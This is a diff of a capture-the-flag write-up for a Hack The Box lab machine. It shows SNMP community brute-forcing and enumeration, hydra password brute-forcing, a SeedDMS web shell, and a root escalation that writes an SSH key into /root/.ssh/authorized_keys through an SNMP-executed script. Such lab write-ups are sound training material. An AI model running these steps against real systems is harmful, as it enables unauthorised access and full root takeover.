@@ -81,18 +81,38 @@ The are 2 types of community strings:
 * public mainly read only functions 
 * private Read/Write in general
 
-There is a tool that bruteforce Community Strings
+We can also bruteforce snmp Community Strings with [onesixtyone](https://github.com/trailofbits/onesixtyone)
 ```bash
-sudo apt install onesixtyone
+❯ onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt 10.10.10.241
+Scanning 1 hosts, 3219 communities
+10.10.10.241 [public] Linux pit.htb 4.18.0-240.22.1.el8_3.x86_64 #1 SMP Thu Apr 8 19:01:30 UTC 2021 x86_64
+10.10.10.241 [public] Linux pit.htb 4.18.0-240.22.1.el8_3.x86_64 #1 SMP Thu Apr 8 19:01:30 UTC 2021 x86_64
 ```
 
-__snmpwalk:__
+Enumerating snmp with `snmpwalk` tool
+
 * enable `snmp-mibs-downloader` to get output in readable format.
+  * First, install with `sudo apt-get install snmp-mibs-downloader`
+  * Now, edit the file `/etc/snmp/snmp.conf` and commenting out `mibs :` line.
+
+some importent information from `snmpwalk`.
+
+[netSnmpObjects](https://oidref.com/1.3.6.1.4.1.8072.1): Extend snmp functionality with external scripts and command.
 ```bash
-❯ snmpwalk -v2c -c public 10.10.10.241 nsExtendOutputFull
+❯ snmpwalk -v2c -c public 10.10.10.241 netSnmpObjects
+NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 1
+NET-SNMP-EXTEND-MIB::nsExtendCommand."monitoring" = STRING: /usr/bin/monitor
+NET-SNMP-EXTEND-MIB::nsExtendArgs."monitoring" = STRING: 
+NET-SNMP-EXTEND-MIB::nsExtendInput."monitoring" = STRING: 
+NET-SNMP-EXTEND-MIB::nsExtendCacheTime."monitoring" = INTEGER: 5
+NET-SNMP-EXTEND-MIB::nsExtendExecType."monitoring" = INTEGER: exec(1)
+NET-SNMP-EXTEND-MIB::nsExtendRunType."monitoring" = INTEGER: run-on-read(1)
+NET-SNMP-EXTEND-MIB::nsExtendStorage."monitoring" = INTEGER: permanent(4)
+NET-SNMP-EXTEND-MIB::nsExtendStatus."monitoring" = INTEGER: active(1)
+NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."monitoring" = STRING: Memory usage
 NET-SNMP-EXTEND-MIB::nsExtendOutputFull."monitoring" = STRING: Memory usage
               total        used        free      shared  buff/cache   available
-Mem:          3.8Gi       342Mi       3.2Gi       8.0Mi       280Mi       3.3Gi
+Mem:          3.8Gi       499Mi       2.8Gi        80Mi       585Mi       3.0Gi
 Swap:         1.9Gi          0B       1.9Gi
 Database status
 OK - Connection to database successful.
@@ -119,17 +139,31 @@ Login Name           SELinux User         MLS/MCS Range        Service
 __default__          unconfined_u         s0-s0:c0.c1023       *
 michelle             user_u               s0                   *
 root                 unconfined_u         s0-s0:c0.c1023       *
-System uptime
- 03:29:38 up  5:57,  0 users,  load average: 0.08, 0.02, 0.01
+# ... [snip] ...
 ```
-* found __potential username:__ michelle
 
-and from full snmpwalk scan found web directory.
+
+[dskTable](https://oidref.com/1.3.6.1.4.1.2021.9): Disk watching information. Partions to be watched are configured by the snmpd.conf file of the agent.
+
 ```bash
-❯ snmpwalk -v2c -c public 10.10.10.241 dskPath
+❯ snmpwalk -v2c -c public 10.10.10.241 dskTable
+UCD-SNMP-MIB::dskIndex.1 = INTEGER: 1
+UCD-SNMP-MIB::dskIndex.2 = INTEGER: 2
 UCD-SNMP-MIB::dskPath.1 = STRING: /
 UCD-SNMP-MIB::dskPath.2 = STRING: /var/www/html/seeddms51x/seeddms
+UCD-SNMP-MIB::dskDevice.1 = STRING: /dev/mapper/cl-root
+UCD-SNMP-MIB::dskDevice.2 = STRING: /dev/mapper/cl-seeddms
+UCD-SNMP-MIB::dskMinimum.1 = INTEGER: 10000
+# ... [snip] ...
 ```
+
+* found __potential username:__ `michelle`
+* Web direcotry: `/seeddms51x/seeddms`
+* snmp extended command: `/usr/bin/monitor`
+* OS: CentOS Linux release 8.3.2011
+* SELinux Enabled
+
+## SeedDMS
 
 * get SeedDMS login page from `http://dms-pit.htb/seeddms51x/seeddms`
   * __SeedDMS__ is a free document management system with an easy to use web based user interface for small and medium sized enterprises. It is based on PHP and MySQL or sqlite3
@@ -148,7 +182,7 @@ SeedDMS versions < 5.1.11 - Remote Command Execution                            
 ----------------------------------------------------------------------------------- ---------------------------------
 ```
 
-* We don't have version confirmation.
+* Don't have version information.
 * And it is a authenticated RCE, required login creds.
 
 ## Login Form Bruteforce with hydra
@@ -160,7 +194,7 @@ using hydra to bruteforce passowrd.
 ![](screenshots/hydra-brute-body.png)
 
 ```bash
-"<Url>:<login-data>:<error>"
+"<url>:<login-data>:<error>"
 ```
 
 ```bash
@@ -203,7 +237,7 @@ __Third,__ Go to `http://dms-pit.htb/seeddms51x/seeddms/data/1048576/29/1.php?cm
 
 ![](screenshots/php-shell.png)
 
-*Reverse shell is not working*
+_Reverse shell is not working_ **Reason: [SElinux](https://www.redhat.com/en/topics/linux/what-is-selinux); ippsec [explained](https://www.youtube.com/watch?v=IF5uhe1qR2I&t=3380s)**
 
 After some enumeration from web shell, found database creds. 
 ```bash
@@ -225,14 +259,7 @@ And get the user shell on host form cockpit terminal.
 
 ## Access control list(ACL)
 
-While enumerating SNMP found a extend script.
-```bash
-❯ snmpwalk -v2c -c public 10.10.10.241 nsExtendCommand
-NET-SNMP-EXTEND-MIB::nsExtendCommand."monitoring" = STRING: /usr/bin/monitor
-```
-
-* `nsExtendCommand` stand for "full path of the command binary (or script) to run"  and there is only one binary in this snmp.
-* Net-SNMP agent provides a method to extend SNMP in Cumulus Linux via the NET-SNMP-EXTEND-MIB. using this MIB to query shell scripts specified by the extend directive in `/etc/snmp/snmpd.conf`.
+* While enumerating SNMP we found a script `/usr/bin/monitor`.
 
 `/usr/bin/monitor` is a bash script that executing another bash script from `/usr/local/monitoring`, But user "michelle" don't have permission to access this folder.
 
@@ -257,7 +284,19 @@ getfacl -e /usr/local/monitoring
 
 looking the acl permissions we can see that user "michelle" have `#effective:-wx` that means user "michelle" can write&execute but can't read.
 
-SNMP executes `/usr/bin/monitor` script, which executes all script from `/usr/local/monitoring` folder with `check*sh`
+## SNMP Extend Command
+
+SNMP executes `/usr/bin/monitor` script.
+```bash
+❯ snmpwalk -v2c -c public 10.10.10.241 nsExtendCommand
+NET-SNMP-EXTEND-MIB::nsExtendCommand."monitoring" = STRING: /usr/bin/monitor
+```
+
+* `nsExtendCommand` stand for "full path of the command binary (or script) to run"  and there is only one binary in this snmp.
+* Net-SNMP agent provides a method to extend SNMP in Cumulus Linux via the NET-SNMP-EXTEND-MIB. using this MIB to query shell scripts specified by the extend directive in `/etc/snmp/snmpd.conf`.
+
+
+That script executes all/any script from `/usr/local/monitoring` directory with `check*sh`
 ```bash
 #!/bin/bash
 
@@ -271,16 +310,17 @@ We can exploit this by create reverse shell script in `/usr/local/monitoring/` a
 
 __First,__ create bash script in `/usr/local/monitoring` folder
 ```bash
-echo -e '#!/bin/bash\n\necho "ssh-rsa [public_key]" > /root/.ssh/authorized_keys' > /usr/local/monitoring/check-pwn.sh
+echo -e '#!/bin/bash\n\necho "ssh-rsa <public_key>" > /root/.ssh/authorized_keys' > /usr/local/monitoring/check-pwn.sh
 ```
 
 __Second,__ execute snmp extend script `/usr/bin/monitor` with [nsExtendObjects](https://oidref.com/1.3.6.1.4.1.8072.1.3.2) from `NET-SNMP-EXTEND-MIB`
 * use MIB `nsExtendObjects` if direct OID is not work.
+* And with that we don't have to run complete snmpwalk and directly execute snmp extend scripts.
 
 ```bash
 snmpwalk -v2c -c public 10.10.10.241 1.3.6.1.4.1.8072.1.3.2
 ```
 
-*Don't know why but nothing else is working for me besides echoing ssh key*
+*Don't know why but nothing else is working for me besides echoing ssh key* **Reason: [SElinux](https://www.redhat.com/en/topics/linux/what-is-selinux); ippsec [explained](https://www.youtube.com/watch?v=IF5uhe1qR2I&t=3380s)**
 
 ![](screenshots/pit-rooted.png)
